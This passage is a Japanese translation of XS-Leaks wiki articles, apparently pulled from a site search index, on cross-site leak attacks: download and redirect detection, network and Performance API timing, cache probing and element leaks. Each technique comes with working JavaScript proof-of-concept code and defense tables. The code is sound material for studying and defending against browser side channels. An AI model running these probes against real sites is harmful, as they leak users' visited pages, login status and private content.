この攻撃は、自動ダウンロード機能が有効になっているChromeベースのブラウザでのみ有効です。加えてこの攻撃はユーザがダウンロードばーばを能動的に閉じないと再検出できないため、繰り返し行うことはできません。 iframeを利用したダウンロード遷移 # Content-Disposition: attachment ヘッダをテストするもう一つの方法は遷移が発生したかどうかをチェックすることです。仮にページの読み込みによってダウンロードが発生した場合、遷移は発生せずウィンドウは同一オリジン内に留まります。
以下のコードは、そのような遷移が発生したかを検出しダウンロードが試行されたかを検出します。
// ダウンロード試行時のテスト先URLを設定する var url = \u0026#39;https://example.org/\u0026#39;; // onloadイベントを計測するための外側のiframeを作成する var iframe = document.createElement(\u0026#39;iframe\u0026#39;); document.body.appendChild(iframe); // ダウンロードの試行をテストするために、内側のiframeを作成 iframe.srcdoc = \`\u0026lt;iframe src=\u0026#34;\${url}\u0026#34; \u0026gt;\u0026lt;/iframe\u0026gt;\`; iframe.onload = () =\u0026gt; { try { // ナビゲーションが発生した場合、iframeはクロスオリジンになるため、\u0026#34;inner.origin \u0026#34;にアクセスすると例外が発生します。 iframe.contentWindow.frames[0].origin; console.log(\u0026#39;Download attempt detected\u0026#39;); } catch(e) { console.log(\u0026#39;No download attempt detected\u0026#39;); } } info
ダウンロードを試行することによりiframe内で画面遷移が発生しない場合、iframeはonloadイベントを直接トリガーしません。そのため、上記の例では代わりに外側にiframeを使用し、その中のiframeを含むサブリソースの読み込みが完了した際にトリガーされるonloadイベントを待ち受けます。 important
この攻撃はどのような[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/にかかわらず動作します。 Content-Disposition: attachmentが指定されるとX-Frame-OptionsとContent-Security-Policyヘッダは無視されるからです。 ダウンロード遷移（iframeなし） # 前項で紹介した手法はwindowオブジェクトを利用しても効果的にテストすることができます。
// 送信先URLをセット var url = \u0026#39;https://example.org\u0026#39;; // windowへの参照を取得 var win = window.open(url); // windowが読み込まれるまで待機 setTimeout(() =\u0026gt; { try { // ナビゲーションが発生した場合、iframeはクロスオリジンになるため、\u0026#34;win.origin\u0026#34; にアクセスすると例外が発生する win.origin; parent.console.log(\u0026#39;Download attempt detected\u0026#39;); } catch(e) { parent.console.log(\u0026#39;No download attempt detected\u0026#39;); } }, 2000); サーバサイドリダイレクト # 拡張 # サーバサイドリダイレクトは、宛先URLのサイズと攻撃者によって制御されている入力値（クエリ文字列またはパスのいずれか）が増加する場合、クロスオリジンのページから検出することができます。以下の手法は大きなクエリ文字列やパスを生成する子男でほとんどのWEBサーバでエラーを誘発することが可能であるという事実に依存しています。リダイレクトはURLのサイズを増加させるため、サーバが処理可能なURLの最大長より正確に1文字減らすることで検出することができます。これによりサイズが大きくなった場合、サーバはクロスオリジンのページから検出可能なエラーを応答します。（例えばエラーイベント経由）
example
攻撃の例はこちらで確認することができます。 here. クロスオリジンリダイレクト # CSP 侵害 # Content-Security-Policy (CSP) はクロスサイトスクリプティングやデータインジェクションに対する綿密な防御機構です。CSPが侵害されるとSecurityPolicyViolationEvent がトリガーされます。攻撃者はconnect-src ディレクティブ を利用してCSPを設定することができます。このディレクティブはfetch がCSPディレクティブで設定されていないURLを追うたびにViolationイベントがトリガーされます。これによって攻撃者は他のオリジンへのリダイレクトが発生したかを検出することができます。
以下の例では、fetch APIで設定（6行目）したウェブサイトがhttps://example.com以外のウェブサイトにリダイレクトされるとSecurityPolicyViolationEvent がトリガーされます。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!-- Set the Content-Security-Policy to only allow example.org --\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;connect-src https://example.org\u0026#34;\u0026gt; \u0026lt;script\u0026gt; // Listen for a CSP violation event document.addEventListener(\u0026#39;securitypolicyviolation\u0026#39;, () =\u0026gt; { console.log(\u0026#34;Detected a redirect to somewhere other than example.org\u0026#34;); }); // Try to fetch example.org. If it redirects to another cross-site website // it will trigger a CSP violation event fetch(\u0026#39;https://example.org/might_redirect\u0026#39;, { mode: \u0026#39;no-cors\u0026#39;, credentials: \u0026#39;include\u0026#39; }); \u0026lt;/script\u0026gt; 攻撃対象のリダイレクトがクロスサイトであることと、SameSite=Laxと設定されたクッキーの存在が条件である場合、fetchはトップレベルの遷移としてカウントされないため上記の手法は動作しません。このような場合、攻撃者は別のCSPディレクティブであるform-actionと、GETを使ってHTMLフォームを送信するとトップレベル遷移としてカウントされるという事実を利用することができます。
以下の例では、フォームのアクション（3行目）がhttps://example.org以外にリダイレクトされるとSecurityPolicyViolationEventがトリガーされます。
1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Content-Security-Policyをexample.orgのみ許可するように設定する --\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;form-action https://example.org\u0026#34;\u0026gt; \u0026lt;form action=\u0026#34;https://example.org/might_redirect\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; // CSP違反イベントをリッスンする document.addEventListener(\u0026#39;securitypolicyviolation\u0026#39;, () =\u0026gt; { console.log(\u0026#34;Detected a redirect to somewhere other than example.org\u0026#34;); }); // フォームからexample.orgを取得してみてください。別のクロスサイトなウェブサイトにリダイレクトされると、CSP違反のイベントが発生する document.forms[0].submit(); \u0026lt;/script\u0026gt; FireFoxではChromeベースのブラウザとは異なりform-actionがform送信後にリダイレクトをブロックしないため、この手法は実行できないことに注意してください。
攻撃シナリオ # とあるオンラインバンクでは富裕層ユーザが口座の残高を確認した際に、ウェブサイト上の予約ページへナビゲーションをトリガーすることにより魅力的な株の投資機会へリダイレクトすることになっています。このように特定のユーザグループに対してのみ行われている場合、攻撃者に顧客ステータスがリークされます。
分割されたHTTPキャッシュの回避 # もし、サイトexample.com が *.example.com/resource からのリソースを含む場合、sのリソースはトップレベルナビゲーションを通して直接リクエストされた場合と同じキャッシュキーを持つことになります。これは、キャッシュキーがトップレベルの eTLD+1 と フレームの eTLD+1 で構成されるからです。1
リソースがキャッシュされているかどうかは window.stop() が実行される前にオリジンが変更されたかどうかをチェックすることによって検出することができるのは、ウィンドウはwindow.stop() で異なるオリジンへのナビゲーションを防ぐことができ、デバイス上のキャッシュはネットワークより高速であるためです。
async function ifCached_window(url) { return new Promise(resolve =\u0026gt; { checker.location = url; // キャッシュのみ setTimeout(() =\u0026gt; { checker.stop(); }, 20); // 結果を取得 setTimeout(() =\u0026gt; { try { let origin = checker.origin; // タイムアウト前にOriginが変更されていない resolve(false); } catch { // Originが変更された resolve(true); checker.location = \u0026#34;about:blank\u0026#34;; } }, 50); }); } windowを作成（チェック成功後に戻ることが可能になる）
let checker = window.open(\u0026#34;about:blank\u0026#34;); 使い方
await ifCached_window(\u0026#34;https://example.org\u0026#34;); info
分割されたHTTPキャッシュを回避するにはヘッダ Vary.Sec-Fetch-Site を使って防ぐことができます。Sec-Fetch-Site はキャッシュを開始者によって分割するため、Cache Protections を参照してください。この攻撃は同じサイトのリソースにのみ適用されるため、Sec-Fetch-Siteヘッダーはウェブサイトの same-site や same-origin に対して、攻撃者にとっては cross-site になるため、うまくいきます。 対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies history.length (iframes) ✔️ ❌ ✔️ FIP history.length (windows) ❌ ✔️ ❌ NIP onload event inside an iframe ✔️ ❌ ✔️ FIP Download bar ✔️ ❌ ❌ \\(^{1}\\) NIP Download Navigation (iframes) ✔️ ❌ ❌ \\(^{1}\\) FIP Download Navigation (windows) ❌ ❌ \\(^{1}\\) ❌ NIP Inflation ✔️ ❌ ❌ RIP CSP Violations ❌ \\(^{2}\\) ❌ ❌ RIP 🔗 NIP 🔗 – Defense mechanisms must be combined to be effective against different scenarios.
COOP と Framing Protections のどちらも、 Content-Disposition ヘッダが存在すると他のヘッダが無視されてしまい、リダイレクトリークを緩和することはできません。 LaxモードのSameSite Cookieは、ウェブサイトのiframingから保護することができますが、Strictモードとは対照的に、ウィンドウへの参照やサーバー側のリダイレクトを含むリークには役立ちません。 Real-World Examples # Twitterに報告された脆弱性は、この手法を利用してXS-Searchによる非公開ツイートの内容を漏洩させるというものでした。この攻撃は、ユーザーのクエリ2に対する結果がある場合にのみ、ページがナビゲーションを開始するため、可能でした。
References # github.com/xsleaks/wiki/pull/106\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Protected tweets exposure through the url, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:14,href:"/docs/attacks/timing-attacks/network-timing/",title:"Network Timing",section:"Timing Attacks",content:`ネットワーク タイミングのサイドチャネルは、ウェブが誕生したときから存在していました。これらの攻撃は、ブラウザがperformance.now()のような高精度のタイマーを出荷し始めたときに、新しい注目を集め、時とともに異なるレベルの影響を持つようになりました。
タイミング測定値を得るために、攻撃者は暗黙的または明示的なクロックを使用する必要があります。これらのクロックは、XS-Leaksの目的では通常交換可能であり、精度と利用可能性が異なるだけです。簡単のために、この記事では、すべてのモダンブラウザに存在する明示的なクロックであるperformance.now()APIを使用することを想定しています。
このサイドチャネルにより、攻撃者はクロスサイトリクエストが完了するまでにかかった時間から情報を推測することができます。ネットワークのタイミング測定は、ユーザーの状態によって変化する可能性があり、通常は下記の要素に連動します。
リソースサイズ バックエンドでの計算時間 サブリソースの数とサイズ キャッシュの状態. tip
クロックの種類については、クロックの記事で詳しく説明しています。 モダンなWebのタイミング攻撃 # performance.now()は、リクエストの実行にかかる時間を測定するために使用できます。
// クロックを開始します。 var start = performance.now() // fetchリクエストが完了するまでの時間を計測します。 fetch(\u0026#39;https://example.org\u0026#39;, { mode: \u0026#39;no-cors\u0026#39;, credentials: \u0026#39;include\u0026#39; }).then(() =\u0026gt; { // fetch終了した時点で時間差を計算します。 var time = performance.now() - start; console.log(\u0026#34;The request took %d ms.\u0026#34;, time); }); Onloadイベント # 同じような処理で、リソースを取得するのにかかる時間を測定するには、単に onload イベントを監視することで可能です。
// 時間が欲しいページを指すscript要素を作成します。 var script = document.createElement(\u0026#39;script\u0026#39;); script.src = \u0026#34;https://example.org\u0026#34;; document.body.appendChild(script); // クロックを開始します。 var start = performance.now(); // スクリプトがロードされたら、リクエストが完了するまでの時間を計算します。 script.onload = () =\u0026gt; { var time = performance.now() - start; console.log(\u0026#34;The request took %d ms.\u0026#34;, time) } tip
同様の手法は他の HTML 要素、例えば \u0026lt;img\u0026gt;, \u0026lt;link\u0026gt;, \u0026lt;iframe\u0026gt; にも使うことができ、他の手法が失敗するシナリオで使用することができます。例えば、Fetch Metadataが script タグへのリソースの読み込みをブロックする場合、image タグへの読み込みを許可することがあります。 tip
別の方法として、image.completeプロパティを使用することもできます。詳しくはこちら Cross-windowなタイミング攻撃 # 攻撃者は、window.openで新しいウィンドウを開き、windowの読み込みが始まるのを待つことで、ページのネットワークタイミングを測定することも可能です。以下のスニペットは、この測定の方法を示しています。
// 新しいウィンドウを開き、iframeの読み込みを開始するタイミングを測定します。 var win = window.open(\u0026#39;https://example.org\u0026#39;); // 最初の時間を計測します。 var start = performance.now(); // ループを定義します。 function measure(){ try{ // ページがロードされた場合、そのページは異なるオリジンになるので、 // \`win.origin\`は例外をスローします。 win.origin; // ウィンドウがsame-originのままであれば、すぐにループを繰り返しますが、 // イベントループはブロックしません。 setTimeout(measure, 0); }catch(e){ // ウィンドウが読み込まれたら、時間差を計算します。 var time = performance.now() - start; console.log(\u0026#39;It took %d ms to load the window\u0026#39;, time); } } // ウィンドウのオリジンが切り替わった時点で抜けるループを開始する measure(); note
このPOCではsetTimeoutを使って、 while(true)ループに相当する部分を大まかに作成していることに注意してください。JSのイベントループがブロックされるのを避けるために、このような方法で実装する必要があります。 tip
この手法は、イベントループをビジー状態にすることで、ページの実行タイミングを測定することにも応用できます。 イベントのアンロード # unloadとbeforeunloadイベントは、リソースを取得するのにかかる時間を測定するために使用することができます。これは、ブラウザが新しいナビゲーションを要求したときにbeforeunloadがトリガーされ、一方、そのナビゲーションが実際に発生したときにunloadがトリガーされるためです。この動作により、これら2つのイベント間の時間差を計算し、ブラウザがリソースの取得を完了するまでにかかった時間を測定することが可能です。
info
unloadとbeforeunloadの時間差はx-frame-options (XFO)ヘッダーの影響を受けません。なぜなら、このイベントはブラウザがレスポンスヘッダーを認識する前に起動されるからです。 以下のスニペットでは、SharedArrayBufferクロックを使用していますが、このスニペットを実行する前に、クロックを開始する必要があります。
// WebWorkerが使用するShared bufferの作成 var sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT); var sharedArray = new Uint32Array(sharedBuffer); // WebWorkerを起動し、呼び出します。 worker.postMessage(sharedBuffer); var start; iframe.contentWindow.onbeforeunload = () =\u0026gt; { // ナビゲーション中の「時間」を取得します start = Atomics.load(sharedArray, 0); } iframe.contentWindow.onpagehide = () =\u0026gt; { // ナビゲーション後の「時間」を取得します var end = Atomics.load(sharedArray, 0); console.log(\u0026#39;The difference between events was %d iterations\u0026#39;, end - start); }; tip
SharedArrayBufferのクロックは高解像度のタイマーを作成するために使用されました。しかし、iframeの beforeunload と unload イベント間の時間差は、他のクロック、例えば*performance.now()*でも測定できます。 tip
このスニペットでは、iframeを利用して計測しています。この攻撃のバリエーションは、ウィンドウの参照を使用することもできますが、これに対する防御はより困難です。 サンドボックス化されたフレームのタイミング攻撃 # もしページにFraming Protectionsが実装されていなければ、攻撃者はページとすべてのサブリソースがネットワーク上でロードされるまでの時間を計ることができます。デフォルトでは、iframeの onload ハンドラはすべてのリソースがロードされ、すべてのJavaScriptの実行が終了した後に呼び出されます。しかし、攻撃者は \u0026lt;iframe\u0026gt; に sandbox 属性を含めることで、スクリプト実行時のノイズを除去することができます。この属性はJavaScriptの実行を含む多くの機能をブロックし、その結果、ほとんど純粋なネットワーク計測を行うことができます。
var iframe = document.createElement(\u0026#39;iframe\u0026#39;); // 対象のWebサイトのURLを設定する iframe.src = \u0026#34;https://example.org\u0026#34;; // スクリプトの実行をブロックするsandbox属性を設定する iframe.sandbox = \u0026#34;\u0026#34;; document.body.appendChild(iframe); // 要求が開始されるまでの時間を測定する var start = performance.now(); iframe.onload = () =\u0026gt; { // iframeが読み込まれたら、時間差を計算する var time = performance.now() - start; console.log(\u0026#34;The iframe and subresources took %d ms to load.\u0026#34;, time) } タイムレスタイミング攻撃 # この他に、タイミング攻撃を実行するために時間の概念を考慮しないタイプの攻撃もあります。このタイムレス攻撃は、2つのHTTPリクエスト(baseline request及びattacked request)を1つのパケットにまとめ、それらをサーバーに同時に到着させることで成立します。サーバーはリクエストを同時に処理し、その実行時間に基づいたレスポンスを可能な限り最速で返します。2つのリクエストのうちどちらかが先に到着することになり、攻撃者はリクエストの到着順序を比較することで時間差を推測することができます。
この手法の利点は、他の手法では常に存在する、ネットワークのジッターや不確定な遅延から独立していることです。
この攻撃は HTTP の特定のバージョンと共同シナリオに限定されます。それは特定の仮定をし、サーバーの動作に関する要件を持っています。
他のタイプの攻撃は、タイミング攻撃を実行する時間の概念を考慮しません 1。 タイムレスな攻撃は、2 つの「HTTP」リクエスト (ベースラインと攻撃リクエスト) を 1 つのパケットに合わせて、サーバーに同時に到着することを保証することで構成されます。 サーバーはリクエストを同時に処理し、できるだけ早く実行時間に基づいて応答を返します。 2 つのリクエストのうちの 1 つが最初に到着するため、攻撃者はリクエストが到着した順序を比較することで時間差を推測できます。
この手法の利点は、ネットワークのジッターや不確実な遅延から独立していることです。これは、残りの手法に常に存在するものです。
important
この攻撃は、HTTPの特定のバージョンと共同シナリオに限定されています。特定の前提や、サーバの動作に関して満たさなくてはならないことがあります。 対策 # Attack Alternative SameSite Cookies (Lax) COOP Framing Protections Isolation Policies Modern Timing Attacks ✔️ ❌ ❌ RIP 🔗 NIP Frame Timing (Network) ✔️ ❌ ❌ FIP Frame Timing (Sandbox) ✔️ ❌ ❌ FIP Cross-window Timing ❌ ✔️ ❌ NIP Timeless Timing ✔️ ✔️ ❌ ❓ 🔗 – Defense mechanisms must be combined to be effective against different scenarios.
参考文献 # Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connections, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:15,href:"/docs/attacks/timing-attacks/performance-api/",title:"Performance API",section:"Timing Attacks",content:` Performance API # Performance APIは、Resource Timing APIのデータによって強化されたパフォーマンス関連の情報へのアクセスを提供します。このAPIは、持続時間のようなネットワークリクエストの時間情報を提供しますが、サーバーから送られたTiming-Allow-Origin: *ヘッダーがある場合、転送サイズとドメイン検索時間も提供されます。 このデータには、 performance.getEntriesまたはperformance.getEntriesByNameを使ってアクセスすることができます。また、performance.now()の差分を使って実行時間を取得することもできますが、これはミリ秒しか提供しないため、Chromeのfetchでは精度が低い可能性があります。
ネットワークのduration # リクエストのNetwork durationを performance API から取得することができます。
以下のスニペットはリクエストを実行し、200ms後に performance オブジェクトから持続時間を取得します。
async function getNetworkDuration(url) { let href = new URL(url).href; // duration = 0 のリクエストがあるため、fetch()の代わりに画像を使用する。 let image = new Image().src = href; // performance.getEntriesByName()に追加されるリクエストを待ちます。 await new Promise(r =\u0026gt; setTimeout(r, 200)); // 最後に追加された時間を取得する let res = performance.getEntriesByName(href).pop(); console.log(\u0026#34;Request duration: \u0026#34; + res.duration); return res.duration } await getNetworkDuration(\u0026#39;https://example.org\u0026#39;); info
他のブラウザと異なり、Firefoxはミリ秒単位で測定値を提供します。 X-Frame-Optionsを検知する # 埋め込み内にページを表示する場合 (たとえば、X-Frame-Options ヘッダーのため)、Chrome の performance オブジェクトに追加されません。
async function isFrameBlocked(url) { let href = new URL(url).href; // この関数が実行される前に、このURLに対するリクエストがあるかもしれません。 let start_count = performance.getEntriesByName(href).length; let embed = document.createElement(\u0026#39;embed\u0026#39;); embed.setAttribute(\u0026#34;hidden\u0026#34;, true); embed.src = href; document.body.appendChild(embed); // performance.getEntriesByName()に追加されるリクエストを待ちます。 await new Promise(r =\u0026gt; setTimeout(r, 1000)); // テスト用エンベッドの削除 document.body.removeChild(embed) return performance.getEntriesByName(href).length === start_count; } await isFrameBlocked(\u0026#39;https://example.org\u0026#39;); note
この手法はChromiumベースのブラウザでのみ有効なようです。 キャッシュされたリソースを検知する # performanceAPI を使用すると、リソースがキャッシュされたかどうかを検出することができます。 Cross-Origin Read Blockingが発動されない限り（リソースはhtml）、チェックの過程でリソースはキャッシュされます。
async function ifCached2(url) { let href = new URL(url).href; await fetch(href, {mode: \u0026#34;no-cors\u0026#34;, credentials: \u0026#34;include\u0026#34;}); // performance.getEntriesByName()に追加されるリクエストを待ちます。 await new Promise(r =\u0026gt; setTimeout(r, 200)); // 最後に追加された時間を取得する let res = performance.getEntriesByName(href).pop(); console.log(\u0026#34;Request duration: \u0026#34; + res.duration); // 304かどうかチェックする if (res.encodedBodySize \u0026gt; 0 \u0026amp;\u0026amp; res.transferSize \u0026gt; 0 \u0026amp;\u0026amp; res.transferSize \u0026lt; res.encodedBodySize) return true if (res.transferSize \u0026gt; 0) return false; if (res.decodedBodySize \u0026gt; 0) return true; // Timing-Allow-Origin ヘッダがない場合、duration を使用する。 return res.duration \u0026lt; 10; } 通信速度 # オクテット単位で通信速度を測定することができます。
async function getSpeed(count = 10) { var total = 0; // 複数回リクエストを行い、平均値を取得する for (let i = 0; i \u0026lt; count; i++) { // キャッシュをバイパスして現在のオリジンにリクエストを行う await fetch(location.href, {cache: \u0026#34;no-store\u0026#34;}); // 追加されるタイミングを待つ await new Promise(r =\u0026gt; setTimeout(r, 200)); // locationの最新のタイミングを取得する let page = window.performance.getEntriesByName(location.href).pop(); // レスポンスタイムをtransferSizeで割って取得 total += (page.responseEnd - page.responseStart) / page.transferSize; } // リクエストの平均レスポンスタイムを取得 return total/count } await averageSpeed = getSpeed(); `}),e.add({id:16,href:"/docs/attacks/cache-probing/",title:"Cache Probing",section:"攻撃手法",content:`Cache Probingは、あるリソースがブラウザによってキャッシュされているかどうかを検知する手法です。そのコンセプトは、初期のWeb1から知られており、当初はタイミングの差異を検知することに基づいていました。
ユーザがWebサイトに訪れると、画像、スクリプト、そしてHTMLコンテンツなどの様々なリソースが取得され、それらは(特定の条件下で)ブラウザによってキャッシュされます。この最適化により、ブラウザはこれらのリソースを再度要求することなくディスクから提供するため、その後のナビゲーションが高速化されます。もし攻撃者がどのリソースがキャッシュされているかを検知できれば、この情報を基に、ユーザが特定のページにアクセスしたことがあるかどうかをリークできます。
Cache Probingのバリエーションとして、Error Eventsを悪用することにより、より正確でインパクトのある攻撃を実行することができます。
攻撃の原理 # 攻撃者は、あるユーザーがあるSNSを訪問したかどうかを知りたいと考えています。
そのSNSにアクセスすると、いくつかのサブリソースがキャッシュされます。 ユーザが、SNSが通常取得するリソースを取得する攻撃者のページを訪問する。 Network Timing XS-Leakの手法を用いて、攻撃者のページはキャッシュからの応答（つまりステップ1が起こった）とネットワークからの応答（つまりステップ1が起こらなかった）の違いを検出することができます。（応答がキャッシュからの場合、遅延は顕著に短くなります。） Error EventsによるCache Probing # Error Events2を利用したキャッシュプロービングは、より正確な攻撃を可能にします。このアプローチでは、時間の計測に頼らず、Error Eventsといくつかのサーバサイドの挙動を活用して、あるリソースがキャッシュされたかどうかを検出します。この攻撃は、以下のステップを必要とします。
ブラウザキャッシュからのリソースを無効化する。このステップは、攻撃が別の訪問で以前にキャッシュされたリソースを考慮しないことを確認するために必要です。 ユーザーの状態によって異なる項目がキャッシュされるようなリクエストを実行する。例えば、ユーザーがログインしている場合にのみ、特定の画像を含むページをロードする。このリクエストは、\u0026lt;link rel=prerender...で対象のウェブサイトに移動したり、iframeでウェブサイトを埋め込んだり、window.openで新しいウィンドウを開くことで発生させることができる。 サーバが拒否するようなリクエストを引き起こす。例えば、長大なRefererヘッダを含んでいて、サーバーがリクエストを拒否するような場合です。もし、ステップ2でリソースがキャッシュされていれば、このリクエストはエラーイベントを発生させることなく、成功します。 キャッシュの無効化 # キャッシュからのリソースを無効にするには、攻撃者はそのサブリソースを取得する際にサーバーがエラーを返すようにする必要があります。これを実現するには、いくつかの方法があります。
ブラウザによってリクエストが開始され、新しいコンテンツを受け取る前にAbortController.abort()で中止された cache:'reload'オプション付きのフェッチリクエスト 長大なRefererヘッダと 'cache':'reload'を持つリクエスト。ブラウザはこれを防ぐためにリファラの長さに上限を設けているので、これはうまくいかないかもしれません。 POSTリクエストに fetch no-cors を指定した場合。エラーが返されない場合でも、ブラウザがキャッシュを無効化することがあります。 Content-Type、Accept、Accept-Languageなど、サーバーを失敗させる可能性のあるリクエストヘッダ。（よりアプリケーションに依存します） その他のリクエストプロパティ これらの方法のいくつかは、しばしばブラウザのバグとみなされていそうです。(例: this bug).
Origin ReflectionによるCORS error # Origin Reflectionは、グローバルにアクセス可能なリソースに、リクエストを初期化したオリジンを反映したAccess-Control-Allow-Origin（ACAO）ヘッダを付与する挙動のことです。これは、CORSの設定ミス3と考えることができ、ブラウザのキャッシュにリソースが存在するかどうかを検知するのに使用できます。
info
例えば、Flask frameworkにおいて、origin refrectionはデフォルトの動作になっています。 もし server.com にホストされているリソースが target.com からリクエストされた場合、オリジンはレスポンスヘッダに次のように反映されるでしょう。Access-Control-Allow-Origin: target.com といった具合です。リソースがキャッシュされている場合、この情報はリソースと一緒にブラウザのキャッシュに保存されます。これにより、もし attacker.com が同じリソースを取得しようとした場合、2つの可能性があります。
リソースがキャッシュにない場合：リソースは Access-Control-Allow-Origin: attacker.com ヘッダーとともにフェッチされ、保存される可能性があります。 リソースがすでにキャッシュにある：フェッチ試行はキャッシュからリソースをフェッチしようとするが、要求しているオリジンと ACAO ヘッダーの値の不一致によりCORSエラーが起こる。（target.comが期待されているが、実際に提供されたのはattacker.com 。）以下に、この脆弱性を悪用して被害者のブラウザのキャッシュ状態を推測するコード例を示します。 // この関数は、単にURLを受け取り、CORS モードでfetchします。 // fetchでエラーが発生した場合、attacker.comと犠牲者のIP間の // オリジンの不一致によるCORSエラーになります。 function ifCached(url) { // fetchエラーの場合はtrueを、 // 成功の場合はfalseに解決するプロミスを返します。 return fetch(url, { mode: \u0026#34;cors\u0026#34; }) .then(() =\u0026gt; false) .catch(() =\u0026gt; true); } // これは、server.comがorigin reflectionのCORS misconfigurationを // 抱えていることを、攻撃者がすでに知っている場合にのみ有効。 var resource_url = \u0026#34;server.com/reflected_origin_resource.html\u0026#34; var verdict = await ifCached(resource_url) console.log(\u0026#34;Resource was cached: \u0026#34; + verdict) tip
これを軽減する最善の方法は、origin reflectionを排除して、 Access-Control-Allow-Originヘッダを使用することです。グローバルにアクセス可能で認証不要なリソースには Access-Control-Allow-Origin: * を使用します。 Fetch with AbortController # 以下のスニペットは、AbortControllerインターフェースをfetchとsetTimeoutと組み合わせることで、リソースがキャッシュされているかどうかを検出し、ブラウザのキャッシュから特定のリソースを退避させる方法を示しています。このテクニックの良いところは、その過程で新しいコンテンツをキャッシュすることなく、プローブが行われることです。
async function ifCached(url, purge = false) { var controller = new AbortController(); var signal = controller.signal; // After 9ms, abort the request (before the request was finished). // The timeout might need to be adjusted for the attack to work properly. // Purging content seems to take slightly less time than probing var wait_time = (purge) ? 3 : 9; var timeout = await setTimeout(() =\u0026gt; { controller.abort(); }, wait_time); try { // credentials option is needed for Firefox let options = { mode: \u0026#34;no-cors\u0026#34;, credentials: \u0026#34;include\u0026#34;, signal: signal }; // If the option \u0026#34;cache: reload\u0026#34; is set, the browser will purge // the resource from the browser cache if(purge) options.cache = \u0026#34;reload\u0026#34;; await fetch(url, options); } catch (err) { // When controller.abort() is called, the fetch will throw an Exception if(purge) console.log(\u0026#34;The resource was purged from the cache\u0026#34;); else console.log(\u0026#34;The resource is not cached\u0026#34;); return false } // clearTimeout will only be called if this line was reached in less than // wait_time which means that the resource must have arrived from the cache clearTimeout(timeout); console.log(\u0026#34;The resource is cached\u0026#34;); return true; } // purge https://example.org from the cache await ifCached(\u0026#39;https://example.org\u0026#39;, true); // Put https://example.org into the cache // Skip this step to simulate a case where example.org is not cached open(\u0026#39;https://example.org\u0026#39;); // wait 1 second (until example.org loads) await new Promise(resolve =\u0026gt; setTimeout(resolve, 1000)); // Check if https://example.org is in the cache await ifCached(\u0026#39;https://example.org\u0026#39;); 対策 # 現在、Cache Probing攻撃からウェブサイトを完全に保護できるような優れた防御メカニズムはありません。それでも、以下のようなCache Protectionsを導入することで、Webサイトのattack surfaceを縮小することは可能です。
Cache-controlヘッダはリソースがキャッシュされるのを防ぐのに利用できます。 Random Tokensは攻撃者がURLを推測できないようにするために使用されます。 Vary: Sec-Fetch-SiteはOriginのグループによってキャッシュを分離するために使用されます。 ネットワーク要求が可能なユーザーコンテンツは、キャッシュを分割できるように、別ドメインまたは公開サフィックスリスト（適用可能な場合）を使用して、独自のeTLD+1上に配置すべきである。 キャッシュプロービング攻撃に対する有望な防御策は、要求元によってHTTPキャッシュを分割することです。このブラウザが提供する保護機能は、攻撃者のオリジンが他のオリジンのキャッシュされたリソースに干渉するのを防ぎます。
info
2021年9月現在、eTLD+1ごとにキャッシュを分割するPartitioned Cachesは、ほとんどのブラウザで利用できますが、アプリケーションはこれに依存できない状況です。 サブドメインからのリクエストやwindow navigationには保護が効きません。 リアルワールドでの例 # Error Events Cache Probingを利用した攻撃者は、ブラウザのキャッシュにビデオのサムネイルが残っているかどうかを確認することで、ユーザが特定のYouTubeビデオを視聴したかどうかを検出することができました4。
参考文献 # Timing Attacks on Web Privacy, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
HTTP Cache Cross-Site Leaks, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
CORS misconfiguration, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Mass XS-Search using Cache Attack, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:17,href:"/docs/attacks/element-leaks/",title:"Element leaks",section:"攻撃手法",content:`一部のHTML要素は、クロスオリジンのページにデータの一部をリークさせるために使用される可能性があります。 たとえば、以下のようなメディアリソースは、サイズ、期間、種類に関する情報をリークさせる可能性があります。
HTMLMediaElementは、メディアのdurationとbufferedの時間をリークします。 HTMLVideoElement はvideoHeightとvideoWidthをリークします。一部のブラウザでは、webkitVideoDecodedByteCount、 webkitAudioDecodedByteCount、webkitDecodedFrameCountも含む可能性があります getVideoPlaybackQuality()はtotalVideoFramesをリークします。 [HTMLImageElement]（https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement）はheightとwidthをリークしますが、画像が無効な場合には、それらは0となり、image.decode()は拒否されます。 メディアタイプの固有のプロパティによって、メディアタイプを区別することができます。 たとえば、\u0026lt;video\u0026gt;の場合はvideoWidth、\u0026lt;audio\u0026gt;の場合はdurationといった具合です。 以下のコードは、リソースの種類を返すサンプルコードを示しています。
async function getType(url) { // リソースがaudioもしくはvideoかどうかを検知 let media = document.createElement(\u0026#34;video\u0026#34;); media.src = url; await new Promise(r=\u0026gt;setTimeout(r,50)); if (media.videoWidth) { return \u0026#34;video\u0026#34;; } else if (media.duration) { return \u0026#34;audio\u0026#34; } // リソースがimageかどうかを検知 let image = new Image(); image.src = url; await new Promise(r=\u0026gt;setTimeout(r,50)); if (image.width) return \u0026#34;image\u0026#34;; } CORBの悪用 # CORB は、間違ったコンテンツタイプが使用された場合にレスポンスを空にするChromeの機能です。 これは、コンテンツタイプが間違っている場合、キャッシュされないことを意味します。 ifCached 関数についてはCache Probingの記事にて確認できます。
